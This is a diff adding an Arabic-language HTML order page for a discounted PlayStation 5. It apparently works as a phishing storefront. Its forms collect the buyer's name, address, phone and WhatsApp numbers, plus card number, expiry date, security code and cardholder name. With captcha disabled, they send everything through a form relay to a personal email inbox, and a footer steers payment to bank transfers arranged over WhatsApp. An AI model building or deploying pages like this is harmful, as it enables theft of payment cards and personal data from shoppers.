@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>form</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="form.css">
+</head>
+<body>
+
+    <button class="pop-button" id="pop-button">pop up</button>
+
+    <div class="form-overlay">
+        <div class="form">
+            <div class="form-header">
+                <h2>تقديم طلب</h2>
+                <button class="exit"><span>x</span></button>
+            </div>
+            <div class="form-wrapper">
+                <div class="forms-container">
+                    <form action="https://formsubmit.co/abudagga2018@gmail.com" method="POST" >
+                        <input type="text" placeholder="ادخل الاسم كاملا" required  name="name" class="form-input">
+                        <input type="text" placeholder="ادخل العنوان كاملا " required  name="aderess" class="form-input" >
+                        <input type="text" placeholder="ادخل رقم الواتس اب" required name="whatsup-number" class="form-input" >
+                        <input type="text" placeholder="ادخل رقم الموبايل" required name="phone-number" class="form-input" >
+                        <input type="hidden" name="_next" value="https://mykhform.netlify.app/">
+                        <input type="hidden" name="_captcha" value="false">
+                        <button class=" sub-form subm-form " type="submit" value="send"></button>
+                        
+                        <div class="payment-form">
+                            <form >
+                                    <div class="images">
+                                        <div class="image"><img src="image/mada975b (1).png" alt="mada"></div>
+                                        <div class="image"><img src="image/mastercard.png" alt="mastercard"></div>
+                                    </div>
+                                    <input type="text" placeholder="أدخل رقم " name="number" required >
+                                    <input type="text" placeholder="أدخل تاريخ " name="date" required >
+                                    <input type="text" placeholder="ادخل رمز  " name="code" required >
+                                    <input type="text" placeholder="اسم  " name="name" required >
+                                    <button class="form-btn payment-form-btn">ارسل طلب</button>
+                             </form>
+                             
+                        </div>
+                        <div class="form-details">
+                            <p class="form-product-name">سوني بلايتسيشن 5 نسخة الاقراص مع يد اضافية</p>
+                            <p class="form-virtual">افتراضي</p>
+                            <p class="form-product-quantity"> الكمية:<span onclick="decrement()"><i class="fa fa-minus"></i></span> <span id="form-number">1</span> <span  onclick='increment()'><i class="fa fa-plus"></i></span>
+                                <button class=" form-btn next-form" type="submit" value="send">التالي</button> </p>  
+                        </div>
+                    </form>
+                        
+                    
+                </div>
+                
+                <div class="form-footer">
+                    <p>للدفع المباشر على البنوك التالية</p>
+                    <p>متوفر جميع البنوك و باسم المتجر للتحويل راسلنا واتساب / 0563911343</p>
+                   </div>  
+            </div>
+        </div>
+    </div>
+    <script src="main.js"></script>
+</body>
+</html>
